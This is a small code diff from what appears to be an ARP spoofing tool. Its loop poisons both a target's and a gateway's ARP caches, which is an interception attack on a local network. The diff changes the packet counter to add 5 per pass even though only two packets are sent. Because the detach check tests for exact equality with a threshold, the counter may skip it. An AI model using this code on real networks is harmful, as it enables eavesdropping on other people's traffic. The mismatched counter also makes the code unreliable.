@@ -201,7 +201,7 @@ def main():
         while True:
             poison_arp_cache(target_ip, target_mac, gateway_ip)
             poison_arp_cache(gateway_ip, gateway_mac, target_ip)
-            packet_count += 2
+            packet_count += 5
 
             if packet_count == DETACH_THRESHOLD:
                 print("[*] Detaching process...")
